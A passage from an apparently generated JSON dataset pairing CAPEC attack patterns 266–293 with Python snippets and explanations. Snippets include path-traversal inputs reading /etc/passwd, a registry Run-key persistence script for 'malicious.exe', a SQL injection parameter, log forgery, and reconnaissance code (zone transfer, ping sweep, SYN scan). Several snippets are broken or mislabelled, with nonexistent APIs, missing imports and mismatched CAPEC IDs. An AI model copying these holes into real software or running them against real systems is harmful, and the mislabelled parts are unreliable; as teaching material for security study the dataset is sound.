        "code_snippet": "user_input = 'user_data'\nglobal_var = None\n\ndef set_global_var(value):\n    global global_var\n    global_var = value\n\n# Simulating user input affecting global variable\nset_global_var(user_input)\n\n# Function that relies on the global variable\ndef process_data():\n    if global_var == 'user_data':\n        print('Processing user data...')\n    else:\n        print('Unknown data')\n\nprocess_data()",
        "description": "This Python code snippet demonstrates the vulnerability of excessive reliance on global variables and improper control of dynamically-identified variables. The `global_var` is declared as a global variable and is set based on user input through the `set_global_var` function. The `process_data` function then relies on this global variable to determine its behavior. This setup is problematic because it allows user input to directly influence the global state of the application, which can lead to security issues such as unauthorized data manipulation or execution of unintended code paths. The code embodies the main idea of CAPEC-77 by showing how user-controlled variables can be manipulated to affect the application's behavior, highlighting the risks associated with global variable manipulation and dynamic variable evaluation."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "import os\n\ndef validate_input(user_input):\n    # Validate input before canonicalization (CWE-180)\n    if '..' in user_input or user_input.startswith('/'):\n        raise ValueError('Invalid input')\n    \n    # Canonicalize the input\n    canonical_path = os.path.normpath(user_input)\n    \n    # Use the canonicalized path\n    with open(canonical_path, 'r') as file:\n        data = file.read()\n    return data\n\n# Example usage\ntry:\n    user_input = '../etc/passwd'\n    print(validate_input(user_input))\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a vulnerability related to the deprecated CAPEC 'Manipulate Canonicalization' and CWE-180 'Incorrect Behavior Order: Validate Before Canonicalize'. The function `validate_input` first validates the user input to check for directory traversal patterns before canonicalizing the path using `os.path.normpath`. This order of operations is incorrect because the validation step should occur after canonicalization to accurately detect and prevent malicious input. The code attempts to open a file based on the user input, which could lead to security issues if the input is not properly validated after canonicalization."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "import os\nimport urllib.parse\n\ndef handle_user_input(user_input):\n    # CWE-180: Validate before canonicalize\n    if '..' in user_input or '%' in user_input:\n        raise ValueError('Invalid input')\n    \n    # Canonicalize the input\n    canonical_input = urllib.parse.unquote(user_input)\n    \n    # CWE-73: External control of file name or path\n    file_path = os.path.join('/safe/directory', canonical_input)\n    \n    # CWE-20: Improper input validation\n    if not os.path.exists(file_path):\n        raise FileNotFoundError('File does not exist')\n    \n    with open(file_path, 'r') as file:\n        content = file.read()\n    \n    return content\n\n# Example usage\ntry:\n    user_input = '%2e%2e%2fetc%2fpasswd'  # Encoded path traversal attempt\n    print(handle_user_input(user_input))\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-147: Leverage Alternate Encoding. The function `handle_user_input` takes user input, which is expected to be a file path. It first attempts to validate the input for dangerous patterns (CWE-180: Validate before canonicalize), but this validation is ineffective against encoded input. The input is then canonicalized using `urllib.parse.unquote`, which decodes any URL-encoded characters. This can lead to a path traversal attack if the input is not properly sanitized. The code then constructs a file path using the potentially dangerous input (CWE-73: External control of file name or path) and attempts to open the file. If the file exists, its content is read and returned. This example highlights the importance of proper input validation and canonicalization order to prevent security vulnerabilities."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "import logging\nimport os\n\n# Setup logging\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\n# Function to log user actions\ndef log_user_action(user, action):\n    logging.info(f'User: {user}, Action: {action}')\n\n# Simulate an attacker manipulating the log file\nif os.path.exists('app.log'):\n    with open('app.log', 'a') as log_file:\n        log_file.write('User: admin, Action: deleted all records\\n')\n\n# Log a normal user action\nlog_user_action('user123', 'logged in')",
        "description": "This Python code snippet demonstrates a logging mechanism that is vulnerable to audit log manipulation. The `log_user_action` function logs user actions to a file named 'app.log'. However, the code also includes a section where an attacker can directly manipulate the log file by appending a forged log entry ('User: admin, Action: deleted all records'). This represents the CAPEC of Audit Log Manipulation, where an attacker can inject, manipulate, or forge log entries due to insufficient access controls. The code also touches on related CWEs: improper output neutralization (CWE-117) by directly writing to the log file, and exposure of sensitive system information (CWE-497) by allowing unauthorized access to the log file."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "import winreg\n\n# CWE-314: Cleartext Storage in the Registry\n# CWE-270: Privilege Context Switching Error\n# This code snippet demonstrates storing sensitive information in cleartext in the Windows Registry\n# and does not handle privilege context switching properly.\n\ndef store_sensitive_info_in_registry(key_path, value_name, sensitive_data):\n    try:\n        # Open the registry key with write access\n        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)\n        \n        # Store sensitive data in cleartext\n        winreg.SetValueEx(registry_key, value_name, 0, winreg.REG_SZ, sensitive_data)\n        winreg.CloseKey(registry_key)\n        print(f\"Successfully stored {value_name} in the registry.\")\n    except Exception as e:\n        print(f\"Failed to store data in the registry: {e}\")\n\n# Example usage\nstore_sensitive_info_in_registry(r'Software\\MyApp', 'SensitiveInfo', 'my_secret_password')",
        "description": "This Python code snippet demonstrates a vulnerable practice of storing sensitive information in cleartext in the Windows Registry (CWE-314). The function `store_sensitive_info_in_registry` takes a registry key path, a value name, and the sensitive data to be stored. It opens the specified registry key with write access and stores the sensitive data in cleartext. Additionally, the code does not handle privilege context switching properly (CWE-270), as it assumes the current user has the necessary permissions to write to the registry without any checks or adjustments. This snippet embodies the main idea of the deprecated CAPEC pattern 'Registry Manipulation' by showing how sensitive information can be improperly handled in the registry."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "import winreg\n\n# Vulnerable code: Adds a new entry to the Windows registry run keys\n# This will execute 'malicious.exe' every time the user logs in\n\ntry:\n    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)\n    winreg.SetValueEx(key, 'MaliciousApp', 0, winreg.REG_SZ, 'C:\\path\\to\\malicious.exe')\n    winreg.CloseKey(key)\n    print('Registry key set successfully.')\nexcept Exception as e:\n    print(f'Failed to set registry key: {e}')",
        "description": "This Python code snippet demonstrates how an adversary can add a new entry to the Windows registry run keys, causing a specified application ('malicious.exe') to execute every time the user logs in. This embodies the main idea of the CAPEC 'Modification of Registry Run Keys'. The code uses the 'winreg' module to open the registry key for the current user's run keys and sets a new value that points to the malicious executable. This can be used to run persistent spyware on a user's machine. The code also highlights CWE-15 (External Control of System or Configuration Setting) by allowing external control over the registry settings, and CWE-314 (Cleartext Storage in the Registry) by storing the path to the executable in cleartext."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Load XML schema from an external source\nschema_url = 'http://example.com/schema.xsd'\nschema_content = requests.get(schema_url).text\n\n# Parse the schema\nschema_tree = ET.ElementTree(ET.fromstring(schema_content))\n\n# Load XML data\nxml_data = '''<data><item>123</item></data>'''\nxml_tree = ET.ElementTree(ET.fromstring(xml_data))\n\n# Validate XML data against the schema\ntry:\n    schema_tree.assertValid(xml_tree)\n    print('XML is valid')\nexcept ET.ParseError as e:\n    print('XML is invalid:', e)\n\n# Process XML data\nfor item in xml_tree.findall('.//item'):\n    print('Processing item:', item.text)",
        "description": "This Python code snippet demonstrates a potential schema poisoning vulnerability. The code loads an XML schema from an external source and uses it to validate XML data. If an adversary can modify the schema at the external URL, they can corrupt or alter the schema, leading to improper validation of the XML data. This can cause the application to process invalid or malicious data, potentially resulting in denial of service, unexpected states, or incomplete data recording. The code also highlights CWE-15 (External Control of System or Configuration Setting) by fetching the schema from an external source, CWE-501 (Trust Boundary Violation) by mixing trusted and untrusted data, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by potentially exposing sensitive data during processing."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "import socket\n\n# Vulnerable function to demonstrate protocol manipulation\n\ndef vulnerable_protocol_communication(server_ip, server_port):\n    try:\n        # Create a socket object\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # Connect to the server\n        s.connect((server_ip, server_port))\n        \n        # Send a message to the server\n        message = 'Hello, Server!'\n        s.sendall(message.encode('utf-8'))\n        \n        # Receive a response from the server\n        response = s.recv(1024)\n        print('Received:', response.decode('utf-8'))\n        \n        # Close the connection\n        s.close()\n    except Exception as e:\n        print('An error occurred:', e)\n\n# Example usage\nvulnerable_protocol_communication('192.168.1.1', 8080)",
        "description": "This Python code snippet demonstrates a basic client-server communication using sockets, which is vulnerable to protocol manipulation attacks. The function `vulnerable_protocol_communication` establishes a connection to a server, sends a message, and receives a response. However, it lacks proper verification of the source of the communication channel (CWE-940), does not ensure message integrity during transmission (CWE-924), and does not protect against capture-replay attacks (CWE-294). This makes it susceptible to various attacks where an adversary can impersonate the server, modify messages, or replay captured messages to bypass authentication."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "import socket\n\n# Vulnerable HTTP server\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    request = client_socket.recv(1024).decode('utf-8')\n    print(f'Received request: {request}')\n\n    # Improper neutralization of CRLF sequences (CWE-113)\n    if 'Content-Length' in request:\n        headers, body = request.split('\\r\\n\\r\\n', 1)\n        content_length = int(headers.split('Content-Length: ')[1].split('\\r\\n')[0])\n        if len(body) < content_length:\n            body += client_socket.recv(content_length - len(body)).decode('utf-8')\n\n    # Vulnerable response construction\n    response = 'HTTP/1.1 200 OK\\r\\n'\n    response += 'Content-Type: text/plain\\r\\n'\n    response += 'Content-Length: 13\\r\\n'\n    response += '\\r\\n'\n    response += 'Hello, world!'\n\n    # Injecting malicious content (HTTP Response Smuggling)\n    if 'smuggle' in request:\n        response += '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Length: 19\\r\\n\\r\\nSmuggled Response'\n\n    client_socket.sendall(response.encode('utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable HTTP server that is susceptible to HTTP Response Smuggling (CAPEC-33). The server improperly handles CRLF sequences (CWE-113) and constructs HTTP responses without proper neutralization of special elements (CWE-74). When a request containing the keyword 'smuggle' is received, the server appends a malicious HTTP response to the legitimate response, demonstrating how an attacker can inject unauthorized responses. This can lead to various security issues, including cache poisoning and cross-site scripting (XSS)."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "from flask import Flask, request, abort\n\napp = Flask(__name__)\n\n@app.route('/admin', methods=['GET'])\ndef admin_panel():\n    if request.method != 'GET':\n        abort(403)  # Only allow GET requests\n    # Simulate sensitive data access\n    return 'Sensitive admin data'\n\n@app.route('/user', methods=['GET', 'POST'])\ndef user_panel():\n    if request.method == 'POST':\n        # Simulate sensitive data access via POST\n        return 'Sensitive user data'\n    return 'User data'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application with two routes: '/admin' and '/user'. The '/admin' route is intended to be accessed only via GET requests, and any other HTTP verb will result in a 403 Forbidden error. The '/user' route allows both GET and POST requests, with different responses based on the HTTP verb used. This setup demonstrates the concept of HTTP Verb Tampering (CAPEC-274), where an attacker could potentially bypass access restrictions by using a different HTTP verb. The code also touches on related CWEs, such as CWE-302 (Authentication Bypass by Assumed-Immutable Data) by assuming the HTTP verb is immutable, and CWE-654 (Reliance on a Single Factor in a Security Decision) by relying solely on the HTTP verb for access control."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "import socket\nimport http.server\nimport threading\n\nclass RebindingHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        if self.path == '/rebind':\n            # Simulate DNS rebinding by changing the IP address\n            self.server.server_address = ('192.168.1.10', self.server.server_address[1])\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'Rebinding to internal IP')\n        else:\n            super().do_GET()\n\n# Bind to all IP addresses (CWE-1327)\nserver_address = ('0.0.0.0', 8080)\nhttpd = http.server.HTTPServer(server_address, RebindingHTTPRequestHandler)\n\n# Start the server in a separate thread\nthread = threading.Thread(target=httpd.serve_forever)\nthread.daemon = True\nthread.start()\n\nprint(f'Server started on {server_address[0]}:{server_address[1]}')\n\n# Simulate a client request to trigger DNS rebinding\nimport requests\nresponse = requests.get('http://localhost:8080/rebind')\nprint(response.text)\n\n# Simulate a client request to the new internal IP\nresponse = requests.get('http://192.168.1.10:8080')\nprint(response.text)",
        "description": "This Python code snippet demonstrates a simplified DNS rebinding attack. The `RebindingHTTPRequestHandler` class handles HTTP GET requests and simulates DNS rebinding by changing the server's IP address to an internal IP (192.168.1.10) when the '/rebind' path is accessed. The server is bound to all IP addresses (0.0.0.0), which is related to CWE-1327. The server runs in a separate thread to allow for concurrent handling of requests. The code also includes a simulation of client requests to trigger the DNS rebinding and then access the new internal IP. This example highlights the vulnerability where an attacker can manipulate DNS resolution to access internal network resources."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "import socket\n\n# Vulnerable function to send sensitive data\ndef send_sensitive_data(data):\n    # CWE-319: Cleartext Transmission of Sensitive Information\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect(('example.com', 80))\n        s.sendall(data.encode('utf-8'))\n\n# Vulnerable function to receive data without integrity check\ndef receive_data():\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.bind(('0.0.0.0', 8080))\n        s.listen()\n        conn, addr = s.accept()\n        with conn:\n            data = conn.recv(1024)\n            # CWE-924: Improper Enforcement of Message Integrity During Transmission\n            return data.decode('utf-8')\n\n# Example usage\nsensitive_info = 'password123'\nsend_sensitive_data(sensitive_info)\nreceived_info = receive_data()\nprint(f'Received: {received_info}')",
        "description": "This Python code snippet demonstrates a vulnerable implementation of inter-component communication. The `send_sensitive_data` function transmits sensitive information (e.g., a password) in cleartext over a network connection, embodying CWE-319 (Cleartext Transmission of Sensitive Information). The `receive_data` function listens for incoming data and receives it without verifying its integrity, representing CWE-924 (Improper Enforcement of Message Integrity During Transmission). These vulnerabilities can be exploited by an adversary to intercept or manipulate the data, aligning with the main idea of CAPEC-272 (Inter-component Protocol Manipulation)."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Sample XML data with sensitive information\nxml_data = '''\n<order>\n    <customer>\n        <name>John Doe</name>\n        <creditCard>1234-5678-9012-3456</creditCard>\n    </customer>\n    <items>\n        <item>\n            <id>1</id>\n            <name>Widget</name>\n            <price>19.99</price>\n        </item>\n    </items>\n</order>\n'''\n\n# Parse the XML data\ntry:\n    root = ET.fromstring(xml_data)\nexcept ET.ParseError as e:\n    print(f\"Error parsing XML: {e}\")\n\n# Improper Neutralization: No validation of XML structure or content\n# Insertion of Sensitive Information: Sensitive data (credit card) is included in the XML\n# Authentication Bypass: Assuming data is immutable and trusted\n\n# Simulate sending the XML data to another actor\ndef send_data(data):\n    print(\"Sending data:\")\n    print(data)\n\nsend_data(xml_data)\n\n# An attacker could manipulate the XML data before sending\nmanipulated_xml_data = '''\n<order>\n    <customer>\n        <name>Jane Doe</name>\n        <creditCard>9876-5432-1098-7654</creditCard>\n    </customer>\n    <items>\n        <item>\n            <id>1</id>\n            <name>Widget</name>\n            <price>19.99</price>\n        </item>\n    </items>\n</order>\n'''\n\nsend_data(manipulated_xml_data)",
        "description": "This Python code snippet demonstrates a vulnerable implementation of an XML-based data interchange protocol. The code parses and sends XML data containing sensitive information (credit card details) without proper validation or neutralization. This represents CWE-707 (Improper Neutralization) and CWE-201 (Insertion of Sensitive Information Into Sent Data). Additionally, the code assumes the data is immutable and trusted, which can be exploited by an attacker to manipulate the XML data, representing CWE-302 (Authentication Bypass by Assumed-Immutable Data). The code highlights the risks of subverting data interchange protocols as described in the CAPEC."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "import requests\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-707: Improper Neutralization\n# CWE-573: Improper Following of Specification by Caller\n\n# Vulnerable web service endpoint\nurl = 'http://example.com/api/getUserData'\n\n# CWE-707: Manipulating call parameters to include unexpected values\nparams = {\n    'userId': '1 OR 1=1'  # SQL Injection attempt\n}\n\n# CWE-602: Client-side enforcement bypass\n# Assuming the client is supposed to enforce some security checks\nresponse = requests.get(url, params=params)\n\n# CWE-573: Improper following of specification\n# The server might not properly handle the unexpected parameter value\nif response.status_code == 200:\n    print('Data:', response.text)\nelse:\n    print('Failed to retrieve data')",
        "description": "This Python code snippet demonstrates a web service protocol manipulation attack. The code sends a GET request to a vulnerable web service endpoint with manipulated parameters. Specifically, it includes an SQL injection attempt in the 'userId' parameter, exploiting CWE-707 (Improper Neutralization). The server-side security is assumed to be enforced on the client side (CWE-602), which is bypassed by directly manipulating the request. Additionally, the server may not properly handle the unexpected parameter value (CWE-573), potentially leading to unauthorized data access or other unintended behavior. This snippet embodies the main idea of CAPEC-### by showing how an adversary can manipulate web service protocols to cause unintended application behavior."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "import requests\n\n# SOAP request with potential vulnerabilities\nsoap_request = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservices\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:Login>\n         <username>admin</username>\n         <password>password</password>\n      </web:Login>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Sending the SOAP request to the server\nresponse = requests.post('http://example.com/webservice', data=soap_request, headers={'Content-Type': 'text/xml'})\n\n# Print the response from the server\nprint(response.text)",
        "description": "This Python code snippet demonstrates a SOAP request to a web service, highlighting potential vulnerabilities related to SOAP manipulation. The SOAP request contains a login operation with hardcoded credentials, which can be manipulated by an adversary. The code does not ensure that the SOAP message is well-formed or that security properties are met (CWE-707). Additionally, it relies on client-side authentication (CWE-603) and does not properly restrict XML external entity references (CWE-611). This can lead to various attacks, including authentication bypass (CWE-294) and client-side enforcement of server-side security (CWE-602). The code represents the main idea of the CAPEC by showing how SOAP parameters can be manipulated to exploit these vulnerabilities."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "import requests\n\n# Vulnerable SOAP request\nwsdl_url = 'http://example.com/service?wsdl'\n\n# Exposing WSDL file containing sensitive information\nresponse = requests.get(wsdl_url)\nprint(response.text)\n\n# SOAP request with parameter tampering\nsoap_body = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservice\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:Login>\n         <web:username>admin</web:username>\n         <web:password>password</web:password>\n      </web:Login>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\nheaders = {'Content-Type': 'text/xml; charset=utf-8'}\n\n# Sending the tampered SOAP request\nresponse = requests.post('http://example.com/service', data=soap_body, headers=headers)\nprint(response.text)\n\n# Capture-replay attack\nreplay_response = requests.post('http://example.com/service', data=soap_body, headers=headers)\nprint(replay_response.text)",
        "description": "This Python code snippet demonstrates a SOAP parameter tampering attack, which is deprecated and now part of SOAP Manipulation (CAPEC-279). The code first exposes a WSDL file containing sensitive information (CWE-651) by making a GET request to the WSDL URL. It then constructs a SOAP request with hardcoded credentials, representing a tampered parameter scenario. The SOAP request is sent to the server, potentially bypassing authentication (CWE-294). Finally, the same request is replayed to illustrate a capture-replay attack, where the same request is sent again to achieve the same effect, further demonstrating the vulnerability."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "import os\nimport socket\n\n# Function to send ICMP Echo Request (Ping)\ndef send_ping(target_ip):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    \n    # ICMP Header: Type (8), Code (0), Checksum (0), Identifier (0), Sequence Number (0)\n    icmp_header = b'\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    \n    # Send ICMP Echo Request\n    sock.sendto(icmp_header, (target_ip, 1))\n    \n    # Receive ICMP Echo Reply\n    response, _ = sock.recvfrom(1024)\n    \n    # Extract and print the response\n    print(f'Received response from {target_ip}: {response}')\n\n# Target IP address\ntarget_ip = '192.168.1.1'\n\n# Send ping to the target IP\nsend_ping(target_ip)",
        "description": "This Python code snippet demonstrates how to send an ICMP Echo Request (Ping) to a target IP address using raw sockets. The code creates a raw socket, constructs an ICMP Echo Request packet, sends it to the target IP, and waits for an ICMP Echo Reply. This process can be used to determine if a target system is responsive, which aligns with the CAPEC description of using ICMP Echo Requests to test for alive hosts. The code also touches on CWE-200 (Exposure of Sensitive Information) as it can reveal the presence of a host, and CWE-319 (Cleartext Transmission of Sensitive Information) since the ICMP packets are sent in cleartext, potentially exposing network information to unauthorized actors."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "import socket\n\n# Function to perform a TCP SYN scan\ndef syn_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n        \n        # Construct a SYN packet\n        syn_packet = b'\\x45\\x00\\x00\\x3c\\x1c\\x46\\x40\\x00\\x40\\x06\\xb1\\xe6'  # Simplified example\n        \n        # Send the SYN packet\n        sock.sendto(syn_packet, (target_ip, target_port))\n        \n        # Receive the response\n        response = sock.recvfrom(1024)\n        \n        # Check if the port is open\n        if response:\n            print(f'Port {target_port} is open on {target_ip}')\n        else:\n            print(f'Port {target_port} is closed on {target_ip}')\n    except socket.error as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nsyn_scan('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a basic TCP SYN scan, which is a common technique used to determine the status of ports on a remote target. The code creates a raw socket and constructs a simplified SYN packet to send to the target IP and port. It then waits for a response to determine if the port is open or closed. This code embodies the main idea of the CAPEC by performing a SYN scan for system reconnaissance. The related CWEs provide additional context, such as the potential exposure of sensitive information (CWE-200) and the risk of excessive attack surface (CWE-1125). The code is simplified for demonstration purposes and does not include all necessary packet construction details."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# ICMP Echo Request (Ping) Packet\nICMP_ECHO_REQUEST = 8\n\n# Function to calculate checksum\ndef checksum(source_string):\n    sum = 0\n    count_to = (len(source_string) // 2) * 2\n    count = 0\n    while count < count_to:\n        this_val = source_string[count + 1] * 256 + source_string[count]\n        sum = sum + this_val\n        sum = sum & 0xffffffff\n        count = count + 2\n    if count_to < len(source_string):\n        sum = sum + source_string[len(source_string) - 1]\n        sum = sum & 0xffffffff\n    sum = (sum >> 16) + (sum & 0xffff)\n    sum = sum + (sum >> 16)\n    answer = ~sum\n    answer = answer & 0xffff\n    answer = answer >> 8 | (answer << 8 & 0xff00)\n    return answer\n\n# Function to create an ICMP packet\ndef create_packet(id):\n    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, id, 1)\n    data = struct.pack('d', time.time())\n    my_checksum = checksum(header + data)\n    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), id, 1)\n    return header + data\n\n# Function to send ICMP Echo Request\ndef send_ping(dest_addr, timeout=1):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        packet_id = int((id(timeout) * time.time()) % 65535)\n        packet = create_packet(packet_id)\n        sock.sendto(packet, (dest_addr, 1))\n        sock.close()\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Vulnerable code: Sending ICMP Echo Request to a target\nsend_ping('192.168.1.1')",
        "description": "This Python code snippet demonstrates the creation and sending of an ICMP Echo Request (Ping) packet, which is the main idea behind the deprecated CAPEC-285. The code constructs an ICMP packet, calculates its checksum, and sends it to a specified destination address. This type of code can be exploited for network reconnaissance or denial-of-service attacks. The related CWEs provide additional context, such as CWE-294 (Authentication Bypass by Capture-replay), which could be relevant if the ICMP packets are used in a replay attack scenario, and CWE-589 (Call to Non-ubiquitous API), which highlights potential issues with using raw sockets that may not be supported on all platforms."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "import os\nimport subprocess\n\ndef check_authentication(user):\n    # CWE-287: Improper Authentication\n    if user == 'admin':\n        return True\n    return False\n\n# CWE-1316: Overlapping protected and unprotected regions\nprotected_region = range(1000, 2000)\nunprotected_region = range(1500, 2500)\n\n# CWE-1229: Creation of Emergent Resource\nemergent_resource = set(protected_region).intersection(unprotected_region)\n\n# Simulate access to emergent resource\nuser = 'guest'\nif check_authentication(user):\n    print(\"Access granted to protected resources.\")\nelse:\n    print(\"Access denied to protected resources.\")\n\n# Bypass access control due to emergent resource\nif emergent_resource:\n    print(\"Accessing emergent resource...\")\n    subprocess.run([\"echo\", \"Accessing protected data through emergent resource!\"])\nelse:\n    print(\"No emergent resource to access.\")",
        "description": "This Python code snippet demonstrates a scenario where improper authentication (CWE-287) and overlapping protected and unprotected regions (CWE-1316) lead to the creation of an emergent resource (CWE-1229). The `check_authentication` function simulates an authentication check that only grants access to 'admin' users. However, due to overlapping address ranges, an emergent resource is created, allowing unauthorized access to protected data. The code then simulates accessing this emergent resource, bypassing the intended access control mechanisms. This embodies the main idea of the deprecated CAPEC pattern, highlighting how infrastructure-based footprinting can lead to security vulnerabilities."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "import dns.resolver\n\n# Function to enumerate MX records for a given domain\ndef enumerate_mx_records(domain):\n    try:\n        mx_records = dns.resolver.resolve(domain, 'MX')\n        for mx in mx_records:\n            print(f'MX Record: {mx.exchange} with priority {mx.preference}')\n    except dns.resolver.NoAnswer:\n        print('No MX records found.')\n    except dns.resolver.NXDOMAIN:\n        print('Domain does not exist.')\n    except Exception as e:\n        print(f'An error occurred: {e}')\n\n# Example usage\nenumerate_mx_records('example.com')",
        "description": "This Python code snippet demonstrates how to enumerate MX (Mail Exchange) records for a given domain using the `dns.resolver` module. The function `enumerate_mx_records` takes a domain name as input and attempts to resolve its MX records. If successful, it prints out the MX records along with their priority. The code handles common exceptions such as no MX records found, non-existent domain, and other general errors.\n\nThe main idea of the CAPEC is to gather information about mail servers in a network by enumerating MX records. This can potentially expose sensitive information such as the IP addresses of firewalls or internal systems. The related CWEs provide additional context on potential weaknesses, such as exposure of sensitive information (CWE-200) and incorrectly specified destinations in communication channels (CWE-941). This code snippet embodies the concept of information gathering through MX record enumeration, which can be a precursor to more targeted attacks."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "import dns.resolver\nimport dns.query\nimport dns.zone\n\n# Vulnerable DNS server address\nvulnerable_dns_server = '192.0.2.1'\n\n# Domain to perform zone transfer on\ndomain = 'example.com'\n\ntry:\n    # Perform a zone transfer\n    zone = dns.zone.from_xfr(dns.query.xfr(vulnerable_dns_server, domain))\n    for name, node in zone.nodes.items():\n        print(zone[name].to_text(name))\nexcept Exception as e:\n    print(f'Zone transfer failed: {e}')",
        "description": "This Python code snippet demonstrates a DNS zone transfer attack, which exploits a misconfigured DNS server that allows zone transfers. The code attempts to transfer the DNS zone data from a specified vulnerable DNS server for a given domain. If successful, it prints out the zone data, which can include sensitive information about the network topology, IP addresses, and hostnames. This represents the main idea of CAPEC-139 (DNS Zone Transfers) and highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing internal network details to an unauthorized actor."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "import socket\nimport struct\nimport os\n\n# Function to send ICMP echo request (ping)\ndef send_ping(sock, addr):\n    icmp_echo_request = struct.pack('!BBHHH', 8, 0, 0, 1, 1)\n    sock.sendto(icmp_echo_request, (addr, 1))\n\n# Function to receive ICMP echo reply\ndef receive_ping(sock):\n    try:\n        data, _ = sock.recvfrom(1024)\n        icmp_header = data[20:28]\n        type, code, checksum, packet_id, sequence = struct.unpack('!BBHHH', icmp_header)\n        if type == 0 and code == 0:\n            return True\n    except socket.timeout:\n        return False\n    return False\n\n# Function to perform host discovery\ndef host_discovery(ip_range):\n    live_hosts = []\n    for ip in ip_range:\n        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:\n            sock.settimeout(1)\n            send_ping(sock, ip)\n            if receive_ping(sock):\n                live_hosts.append(ip)\n    return live_hosts\n\n# Example usage\nif __name__ == '__main__':\n    ip_range = ['192.168.1.{}'.format(i) for i in range(1, 255)]\n    live_hosts = host_discovery(ip_range)\n    print('Live hosts:', live_hosts)\n",
        "description": "This Python code snippet demonstrates a basic implementation of a host discovery (ping sweep) tool. It sends ICMP echo requests (pings) to a range of IP addresses and listens for ICMP echo replies to determine which hosts are alive. The code uses raw sockets to craft and send ICMP packets, and it processes the responses to identify live hosts. This embodies the main idea of the CAPEC 'Host Discovery' by performing network reconnaissance to identify active hosts. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-291 (Reliance on IP Address for Authentication), by potentially exposing network information to unauthorized actors and relying on IP addresses for identifying hosts."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
